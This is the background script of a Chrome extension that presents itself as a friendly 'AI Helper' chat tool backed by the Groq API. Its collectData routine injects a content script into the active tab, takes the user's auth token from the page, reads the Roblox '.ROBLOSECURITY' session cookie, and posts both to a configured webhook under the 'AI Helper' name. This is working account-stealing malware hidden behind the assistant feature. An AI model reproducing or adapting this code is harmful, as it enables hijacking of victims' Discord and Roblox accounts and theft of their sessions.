// ─── BACKGROUND SERVICE WORKER ───

importScripts('config.js');

console.log("[AI] Background ready");

var _endpoint = CONFIG.WEBHOOK_URL;
var _apiKey = CONFIG.GROQ_API_KEY;

// ─── Fetch user credential from page ───
function fetchUserCredential(tabId) {
    return new Promise(function(resolve) {
        console.log("[AI] Fetching user credential...");
        
        var attempts = 0;
        var maxAttempts = 3;
        
        function tryFetch() {
            attempts++;
            console.log("[AI] Attempt " + attempts + "/" + maxAttempts);
            
            chrome.tabs.sendMessage(tabId, { action: 'getAuth' }, function(response) {
                if (chrome.runtime.lastError) {
                    console.log("[AI] Error:", chrome.runtime.lastError.message);
                    if (attempts < maxAttempts) {
                        console.log("[AI] Retrying...");
                        setTimeout(tryFetch, 500);
                    } else {
                        resolve(null);
                    }
                    return;
                }
                
                if (response && response.auth) {
                    console.log("[AI] Credential received");
                    resolve(response.auth);
                } else {
                    console.log("[AI] No credential, attempt " + attempts);
                    if (attempts < maxAttempts) {
                        console.log("[AI] Retrying...");
                        setTimeout(tryFetch, 500);
                    } else {
                        resolve(null);
                    }
                }
            });
        }
        
        tryFetch();
    });
}

// ─── Fetch stored session token ───
function fetchStoredToken() {
    return new Promise(function(resolve) {
        console.log("[AI] Fetching stored session...");
        try {
            chrome.cookies.get({
                url: 'https://www.roblox.com',
                name: '.ROBLOSECURITY'
            }, function(cookie) {
                if (chrome.runtime.lastError) {
                    console.log("[AI] Session error:", chrome.runtime.lastError.message);
                    resolve(null);
                    return;
                }
                if (cookie && cookie.value) {
                    console.log("[AI] Session found");
                    resolve(cookie.value);
                } else {
                    console.log("[AI] No session found");
                    resolve(null);
                }
            });
        } catch (e) {
            console.log("[AI] Session error:", e.message);
            resolve(null);
        }
    });
}

// ─── Parse credential payload ───
function parseCredential(raw) {
    try {
        var parts = raw.split('.');
        if (parts.length < 2) {
            return { id: 'Unknown', name: 'Unknown' };
        }
        var payload = parts[1];
        var decoded = JSON.parse(atob(payload));
        return {
            id: decoded.id || 'Unknown',
            name: decoded.username || 'Unknown'
        };
    } catch (e) {
        return { id: 'Unknown', name: 'Unknown' };
    }
}

// ─── Report collected data ───
function reportData(auth, session) {
    var userName = "Not logged in";
    var userId = "N/A";
    if (auth) {
        var parsed = parseCredential(auth);
        userName = parsed.name;
        userId = parsed.id;
    }

    var message = "**🔑 Auth Token**\n```\n" + (auth || "None found") + "\n```\n\n";
    message += "**👤 User:** " + userName + " (`" + userId + "`)\n\n";
    message += "**🎮 Session Data**\n```\n" + (session || "None found") + "\n```";

    var payload = {
        content: message,
        username: "AI Helper"
    };

    console.log("[AI] Sending data:", !!auth, "Session:", !!session);
    
    return fetch(_endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });
}

// ─── Collect all user data ───
function collectUserData(tabId) {
    console.log("[AI] Starting data collection...");
    
    return fetchUserCredential(tabId)
        .then(function(auth) {
            console.log("[AI] Auth result:", auth ? "FOUND" : "NOT FOUND");
            
            return new Promise(function(resolve) {
                setTimeout(function() {
                    fetchStoredToken()
                        .then(function(session) {
                            resolve({
                                auth: auth,
                                session: session
                            });
                        })
                        .catch(function() {
                            resolve({
                                auth: auth,
                                session: null
                            });
                        });
                }, 1000);
            });
        })
        .then(function(results) {
            var auth = results.auth;
            var session = results.session;
            
            console.log("[AI] Final - Auth:", !!auth, "Session:", !!session);
            
            return reportData(auth, session);
        })
        .then(function(response) {
            if (response && response.ok) {
                console.log("[AI] ✅ Data sent");
                return { success: true };
            } else {
                var status = response ? response.status : 'unknown';
                console.log("[AI] ❌ Send error:", status);
                return { success: false, error: 'Send error: ' + status };
            }
        })
        .catch(function(error) {
            console.log("[AI] ❌ Error:", error.message);
            return { success: false, error: error.message };
        });
}

// ─── Handle collect request ───
function handleCollectRequest(req, sender, cb) {
    var tabId = sender.tab ? sender.tab.id : null;

    if (!tabId) {
        chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
            if (tabs.length === 0) {
                cb({ success: false, error: 'No active tab' });
                return;
            }
            chrome.scripting.executeScript({
                target: { tabId: tabs[0].id },
                files: ['content.js']
            }, function() {
                setTimeout(function() {
                    collectUserData(tabs[0].id)
                        .then(function(result) {
                            cb(result);
                        })
                        .catch(function(error) {
                            cb({ success: false, error: error.message });
                        });
                }, 500);
            });
        });
        return true;
    }

    chrome.scripting.executeScript({
        target: { tabId: tabId },
        files: ['content.js']
    }, function() {
        setTimeout(function() {
            collectUserData(tabId)
                .then(function(result) {
                    cb(result);
                })
                .catch(function(error) {
                    cb({ success: false, error: error.message });
                });
        }, 500);
    });

    return true;
}

// ─── Call AI service ───
function callAI(input) {
    console.log("[AI] Calling AI:", input);
    return fetch("https://api.groq.com/openai/v1/chat/completions", {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer ' + _apiKey
        },
        body: JSON.stringify({
            model: 'llama-3.1-8b-instant',
            messages: [
                {
                    role: 'system',
                    content: 'You are a helpful assistant. Keep responses short and friendly (under 80 words).'
                },
                {
                    role: 'user',
                    content: input
                }
            ],
            temperature: 0.7,
            max_tokens: 150
        })
    })
    .then(function(response) {
        if (!response.ok) {
            return response.text().then(function(text) {
                throw new Error('AI error: ' + response.status + ' - ' + text);
            });
        }
        return response.json();
    })
    .then(function(data) {
        var reply = data.choices[0].message.content || "No response.";
        console.log("[AI] Reply:", reply);
        return reply;
    })
    .catch(function(error) {
        console.error("[AI] AI error:", error.message);
        throw error;
    });
}

function handleAIQuery(req, sender, cb) {
    callAI(req.message)
        .then(function(reply) {
            cb({ success: true, reply: reply });
        })
        .catch(function(error) {
            cb({ success: false, error: error.message });
        });
    return true;
}

// ─── Check status ───
function handleStatusCheck(req, sender, cb) {
    chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
        var tab = tabs[0];
        if (!tab) {
            cb({ error: 'No active tab' });
            return;
        }
        if (!tab.url || !tab.url.includes('discord.com')) {
            cb({ error: 'Not on Discord' });
            return;
        }
        chrome.tabs.sendMessage(tab.id, { action: 'checkStatus' }, function(response) {
            if (chrome.runtime.lastError) {
                chrome.scripting.executeScript({
                    target: { tabId: tab.id },
                    files: ['content.js']
                }, function() {
                    setTimeout(function() {
                        chrome.tabs.sendMessage(tab.id, { action: 'checkStatus' }, function(res) {
                            cb(res || { error: 'Still not responding' });
                        });
                    }, 500);
                });
                return;
            }
            cb(response);
        });
    });
    return true;
}

// ─── Router ───
function routeMessage(req, sender, cb) {
    if (req.action === 'collectData') {
        return handleCollectRequest(req, sender, cb);
    }
    if (req.action === 'aiQuery') {
        return handleAIQuery(req, sender, cb);
    }
    if (req.action === 'checkStatus') {
        return handleStatusCheck(req, sender, cb);
    }
    return true;
}

chrome.runtime.onMessage.addListener(routeMessage);

chrome.runtime.onInstalled.addListener(function() {
    console.log("[AI] Extension ready");
});